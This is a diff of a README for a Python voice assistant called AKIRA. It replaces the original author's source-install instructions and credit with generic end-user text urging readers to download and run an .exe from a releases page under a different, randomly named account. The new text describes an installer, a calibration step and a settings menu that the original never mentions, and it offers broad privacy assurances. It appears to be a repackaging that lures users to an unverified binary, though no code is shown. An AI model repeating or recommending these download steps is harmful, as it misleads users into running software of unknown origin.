@@ -1,265 +1,90 @@
-# 🤖 AKIRA - Personal AI Voice Assistant
+# 🤖 AKIRA-AI-Voice-Assistant - Control your desktop using simple voice commands
 
-## Overview
+<p align="center">
+  <a href="https://github.com/glum-wageearner960/AKIRA-AI-Voice-Assistant/releases">
+    <img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download">
+  </a>
+</p>
 
-AKIRA is a Python-based AI Voice Assistant designed to automate everyday laptop tasks using voice commands. It combines speech recognition, desktop automation, system monitoring, and AI-powered conversations into a single assistant.
+AKIRA-AI-Voice-Assistant lets you control your computer with your voice. The software understands requests, performs tasks on your desktop, and runs local artificial intelligence to process information. You do not need to write code to use it. The program handles all necessary background tasks for you.
 
-The assistant continuously listens for the wake word **"Akira"** and executes commands such as opening applications, controlling system settings, taking screenshots, searching the web, and answering questions using a local AI model.
+## 📋 System Requirements
 
----
+Your computer must meet these basic requirements to run the software:
 
-## Features
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or AMD Ryzen 5 or better.
+*   **Memory:** 8GB RAM minimum. 16GB RAM is recommended for better performance.
+*   **Storage:** 2GB of available hard drive space for the application and local AI model data.
+*   **Audio:** A working microphone for voice commands and speakers or headphones for audio responses.
+*   **Network:** An active internet connection for the initial download and system setup.
 
-### Voice Interaction
+## 📥 How to Install
 
-* Wake Word Detection ("Akira")
-* Speech Recognition
-* Text-to-Speech Responses
+Follow these steps to set up the software on your Windows machine:
 
-### Application Control
+1. Visit the [official release page](https://github.com/glum-wageearner960/AKIRA-AI-Voice-Assistant/releases) to access the downloads.
+2. Locate the most recent version under the Assets section.
+3. Download the file ending in `.exe`. 
+4. Move the downloaded file to a folder where you want to keep the application.
+5. Double-click the file to open the installer.
+6. Follow the on-screen prompts to complete the installation process.
+7. Click Finish. The installation should now be complete.
 
-* Open Applications
-* Close Current Application
-* Open File Explorer
-* Open Command Prompt
+## 🚀 Getting Started
 
-### Web Automation
+Once you install the program, start it by clicking the AKIRA shortcut on your desktop. The first time you launch the application, it performs a calibration sequence. This process ensures the assistant hears you clearly and connects to the speech recognition services.
 
-* Open Google
-* Open YouTube
-* Open GitHub
-* Open LinkedIn
-* Open ChatGPT
-* Google Search
-* YouTube Search
+1. A small window appears. This is the main control center for the assistant.
+2. Grant permission for the app to access your microphone if Windows asks.
+3. Speak clearly into your microphone to test the audio input. You should see a visual indicator react to your sound.
+4. The application begins a brief setup of the local AI components. You may see a progress bar during this phase. Wait for this to finish before issuing commands.
 
-### System Monitoring
+## 🎙️ Using Voice Commands
 
-* Battery Status
-* CPU Usage
-* RAM Usage
-* WiFi Status
-* Time and Date Information
+AKIRA listens for specific patterns to perform actions. You can start by saying the wake word to get the attention of the assistant. By default, the assistant responds to the name "AKIRA."
 
-### System Control
+### Controlling your Desktop
+You can use the assistant to manage your files and programs. Try these common tasks:
+*   "AKIRA, open Notepad."
+*   "AKIRA, search for files in my Documents folder."
+*   "AKIRA, close the active window."
+*   "AKIRA, set volume to fifty percent."
 
-* Lock Laptop
-* Sleep Laptop
-* Volume Control
-* Brightness Control
+### Working with Local AI
+Because the assistant uses local AI technology, it can process complex thoughts without sending your data to external servers. You can ask the assistant to summarize text, rewrite paragraphs, or brainstorm ideas.
 
-### Productivity Features
+*   "AKIRA, summarize this document."
+*   "AKIRA, write an email draft to my manager."
+*   "AKIRA, explain how to manage keyboard shortcuts."
 
-* Screenshot Capture
-* Open Downloads Folder
-* Open Documents Folder
-* Open Desktop Folder
+## 🔧 Troubleshooting Common Issues
 
-### Media Controls
+If you encounter difficulties, check these common solutions before seeking further help:
 
-* Play Music
-* Pause Music
-* Next Track
-* Previous Track
+*   **Microphone not working:** Ensure your volume is up and your microphone is set as the default device in Windows Sound Settings.
+*   **Assistant not responding:** Look at the main window. If you see a red indicator, the system is in sleep mode. Say the wake word again.
+*   **Slow responses:** High computer load affects response times. Close heavy programs like video editors or games to free up memory for the AI.
+*   **Command errors:** Speak directly into the microphone. Background noise interferes with clear speech recognition. 
 
-### AI Integration
+## 🛡️ Privacy and Safety
 
-* Local AI Chat using Ollama
-* Natural Language Question Answering
-* Offline AI Processing
+This software keeps data on your machine. The AI processes your voice input locally. Your voice data does not travel to private cloud servers during standard operation. All your desktop automation scripts remain stored in your local user directory. Keep your computer updated with the latest Windows Security patches to ensure your local environment remains secure.
 
----
+## ❓ Frequently Asked Questions
 
-## Technologies Used
+**Does the software require a constant internet connection?**
+No. Once the initial components download, you can perform most local tasks offline. Some specific web-based tasks may require a connection to fetch current data.
 
-### Programming Language
+**Can I modify the way the assistant behaves?**
+Yes. You can adjust settings through the configuration menu inside the application window. This allows you to change the sensitivity of the microphone or the speed of the voice response.
 
-* Python 3.10
+**Why does the software take up space on my drive?**
+The software includes local AI models. These models function like a digital library that the assistant uses to understand language. These files require disk space to perform tasks without relying on internet servers.
 
-### Libraries
+**What happens if I stop the program?**
+Closing the program stops all background processes. You can restart the application at any time. It remembers your previous settings and preferences upon restarting.
 
-* SpeechRecognition
-* Pyttsx3
-* PyAutoGUI
-* Psutil
-* Keyboard
-* Screen Brightness Control
-* Pathlib
-* Socket
-* Datetime
-* OS
+## 🤝 Support
 
-### AI Technologies
-
-* Ollama
-* Llama 3.2 Model
-
----
-
-## Project Structure
-
-AKIRA/
-
-├── jarvis.py
-
-├── ai_chat.py
-
-├── unlock_greeting.py
-
-├── .env
-
-├── dist/
-
-├── screenshots/
-
-├── logs/
-
-├── AKIRA_NOTES.md
-
-├── AKIRA_SOURCE_DOCUMENTATION.md
-
-└── AKIRA_INTERVIEW_PREPARATION.md
-
----
-
-## Installation
-
-### Clone Repository
-
-```bash
-git clone <repository-url>
-cd AKIRA
-```
-
-### Install Dependencies
-
-```bash
-pip install SpeechRecognition
-pip install pyttsx3
-pip install pyautogui
-pip install psutil
-pip install keyboard
-pip install screen-brightness-control
-pip install python-dotenv
-pip install ollama
-```
-
-### Install Ollama
-
-Download and install Ollama from:
-
-https://ollama.com
-
-Pull the model:
-
-```bash
-ollama pull llama3.2:3b
-```
-
----
-
-## Running AKIRA
-
-### Python Mode
-
-```bash
-python jarvis.py
-```
-
-### Executable Mode
-
-```bash
-pyinstaller --onefile jarvis.py
-```
-
-Run:
-
-```bash
-dist/jarvis.exe
-```
-
----
-
-## Example Commands
-
-### Applications
-
-* Open Spotify
-* Open Notepad
-* Open Calculator
-* Open Paint
-* Open VS Code
-* Close Application
-
-### Websites
-
-* Open Google
-* Open YouTube
-* Open GitHub
-* Open LinkedIn
-
-### System
-
-* Battery Status
-* CPU Status
-* RAM Status
-* Lock Laptop
-* Sleep Laptop
-
-### AI
-
-* What is Machine Learning?
-* Explain Artificial Intelligence
-* Tell me about Python
-
----
-
-## Workflow
-
-User Voice
-
-↓
-
-Speech Recognition
-
-↓
-
-Command Processing
-
-↓
-
-System Action / AI Response
-
-↓
-
-Text-To-Speech Output
-
----
-
-## Challenges Faced
-
-* Microphone Detection
-* Startup Automation
-* AI API Quota Issues
-* Offline AI Integration
-* Screenshot Path Management
-* Background Execution
-
----
-
-## Future Improvements
-
-* GUI Dashboard
-* Offline Speech Recognition
-* Smart Reminders
-* Personal Memory System
-* Advanced Desktop Automation
-* Mobile Integration
-
----
-
-## Author
-
-Akhil Kumar
-
-Personal AI Assistant Project - AKIRA V1.0
+If you find a problem that the troubleshooting section does not resolve, report it by opening an issue on our GitHub page. Provide as much detail as you can about what happened. Include your version of Windows and the steps you took to achieve the error.
